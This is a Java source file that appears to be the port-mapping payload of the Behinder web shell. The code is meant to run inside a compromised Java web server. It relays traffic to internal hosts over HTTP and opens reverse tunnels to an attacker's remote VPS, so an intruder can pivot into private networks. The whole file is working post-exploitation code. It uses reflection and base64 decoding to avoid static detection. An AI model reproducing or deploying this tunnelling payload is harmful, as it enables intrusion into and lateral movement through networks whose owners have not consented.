package net.rebeyond.behinder.payload.java;

import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import java.util.Map;
import org.objectweb.asm.Opcodes;

public class PortMap implements Runnable {
    public static String action;
    public static String extraData;
    public static String remoteIP;
    public static String remotePort;
    public static String socketHash;
    public static String targetIP;
    public static String targetPort;
    private Object Request;
    private Object Response;
    private Object Session;
    Object httpSession;
    String localKey;
    String remoteKey;
    String type;

    public boolean equals(Object obj) {
        try {
            fillContext(obj);
            portMap();
            return true;
        } catch (Exception e) {
            return true;
        }
    }

    public void portMap() throws Exception {
        String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
        if (action.equals("createLocal")) {
            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                sessionSetAttribute(this.Session, localSessionKey, socketChannel);
                this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
            } catch (Exception e) {
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new byte[]{55, 33, 73, 54});
                    write.invoke(so, e.getMessage().getBytes());
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        } else if (action.equals("read")) {
            SocketChannel socketChannel2 = (SocketChannel) sessionGetAttribute(this.Session, localSessionKey);
            if (socketChannel2 != null) {
                try {
                    ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    socketChannel2.configureBlocking(false);
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so2.getClass().getMethod("write", byte[].class, Integer.TYPE, Integer.TYPE);
                    for (int bytesRead = socketChannel2.read(buf); bytesRead > 0; bytesRead = socketChannel2.read(buf)) {
                        write2.invoke(so2, buf.array(), 0, Integer.valueOf(bytesRead));
                        so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                        buf.clear();
                    }
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                } catch (Exception e2) {
                    this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
                    try {
                        Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write3 = so3.getClass().getMethod("write", byte[].class);
                        write3.invoke(so3, new byte[]{55, 33, 73, 54});
                        write3.invoke(so3, e2.getMessage().getBytes());
                        so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                        so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                        socketChannel2.socket().close();
                    } catch (IOException ioException) {
                        ioException.printStackTrace();
                    }
                }
            }
        } else if (action.equals("write")) {
            SocketChannel socketChannel3 = (SocketChannel) sessionGetAttribute(this.Session, localSessionKey);
            try {
                byte[] extraDataByte = base64decode(extraData);
                ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                buf2.clear();
                buf2.put(extraDataByte);
                buf2.flip();
                while (buf2.hasRemaining()) {
                    socketChannel3.write(buf2);
                }
            } catch (Exception e3) {
                try {
                    Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write4 = so4.getClass().getMethod("write", byte[].class);
                    write4.invoke(so4, new byte[]{55, 33, 73, 54});
                    write4.invoke(so4, e3.getMessage().getBytes());
                    so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                    so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
                    socketChannel3.socket().close();
                } catch (IOException ioException2) {
                    ioException2.printStackTrace();
                }
            }
        } else if (action.equals("closeLocal")) {
            Enumeration attributeNames = sessionGetAttributeNames(this.Session);
            while (attributeNames.hasMoreElements()) {
                String attrName = attributeNames.nextElement().toString();
                if (attrName.startsWith("local_")) {
                    sessionRemoveAttribute(this.Session, attrName);
                }
            }
        } else if (action.equals("createRemote")) {
            new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session)).start();
            this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
        } else if (action.equals("closeRemote")) {
            sessionSetAttribute(this.Session, "remoteRunning", false);
            Enumeration attributeNames2 = sessionGetAttributeNames(this.Session);
            while (attributeNames2.hasMoreElements()) {
                String attrName2 = attributeNames2.nextElement().toString();
                if (attrName2.startsWith("remote")) {
                    sessionRemoveAttribute(this.Session, attrName2);
                }
            }
        }
    }

    public PortMap(String localKey2, String remoteKey2, String type2, Object session) {
        this.localKey = localKey2;
        this.remoteKey = remoteKey2;
        this.httpSession = session;
        this.type = type2;
    }

    public PortMap() {
    }

    public void run() {
        if (this.type.equals("create")) {
            sessionSetAttribute(this.httpSession, "remoteRunning", true);
            while (((Boolean) sessionGetAttribute(this.httpSession, "remoteRunning")).booleanValue()) {
                try {
                    String target = targetIP;
                    int port = Integer.parseInt(targetPort);
                    String vps = remoteIP;
                    int vpsPort = Integer.parseInt(remotePort);
                    SocketChannel remoteSocketChannel = SocketChannel.open();
                    remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));
                    String remoteKey2 = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                    sessionSetAttribute(this.httpSession, remoteKey2, remoteSocketChannel);
                    ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    int bytesRead = remoteSocketChannel.read(buf);
                    if (bytesRead > 0) {
                        remoteSocketChannel.configureBlocking(true);
                        SocketChannel localSocketChannel = SocketChannel.open();
                        localSocketChannel.connect(new InetSocketAddress(target, port));
                        localSocketChannel.configureBlocking(true);
                        String localKey2 = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                        sessionSetAttribute(this.httpSession, localKey2, localSocketChannel);
                        localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
                        new Thread(new PortMap(localKey2, remoteKey2, "read", this.httpSession)).start();
                        new Thread(new PortMap(localKey2, remoteKey2, "write", this.httpSession)).start();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } else if (this.type.equals("read")) {
            while (((Boolean) sessionGetAttribute(this.httpSession, "remoteRunning")).booleanValue()) {
                try {
                    SocketChannel localSocketChannel2 = (SocketChannel) sessionGetAttribute(this.httpSession, this.localKey);
                    ByteBuffer buf2 = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    OutputStream so = ((SocketChannel) sessionGetAttribute(this.httpSession, this.remoteKey)).socket().getOutputStream();
                    for (int bytesRead2 = localSocketChannel2.read(buf2); bytesRead2 > 0; bytesRead2 = localSocketChannel2.read(buf2)) {
                        so.write(buf2.array(), 0, bytesRead2);
                        so.flush();
                        buf2.clear();
                    }
                    so.flush();
                    so.close();
                } catch (IOException e2) {
                    try {
                        Thread.sleep(10);
                    } catch (Exception e3) {
                    }
                }
            }
        } else if (this.type.equals("write")) {
            while (((Boolean) sessionGetAttribute(this.httpSession, "remoteRunning")).booleanValue()) {
                try {
                    SocketChannel remoteSocketChannel2 = (SocketChannel) sessionGetAttribute(this.httpSession, this.remoteKey);
                    ByteBuffer buf3 = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    OutputStream so2 = ((SocketChannel) sessionGetAttribute(this.httpSession, this.localKey)).socket().getOutputStream();
                    for (int bytesRead3 = remoteSocketChannel2.read(buf3); bytesRead3 > 0; bytesRead3 = remoteSocketChannel2.read(buf3)) {
                        so2.write(buf3.array(), 0, bytesRead3);
                        so2.flush();
                        buf3.clear();
                    }
                    so2.flush();
                    so2.close();
                } catch (IOException e4) {
                    try {
                        Thread.sleep(10);
                    } catch (Exception e5) {
                    }
                }
            }
        }
    }

    private byte[] base64decode(String text) throws Exception {
        try {
            if (System.getProperty("java.version").compareTo("1.9") >= 0) {
                getClass();
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
                return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            }
            getClass();
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, text);
        } catch (Exception e) {
            return null;
        }
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        try {
            return (Enumeration) session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", new Class[0]).invoke(session, key);
        } catch (Exception e) {
        }
    }

    private void doOutPut(Object response, byte[] data) throws Exception {
        Object so = response.getClass().getMethod("getOutputStream", new Class[0]).invoke(response, new Object[0]);
        so.getClass().getMethod("write", byte[].class).invoke(so, data);
        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
    }
}
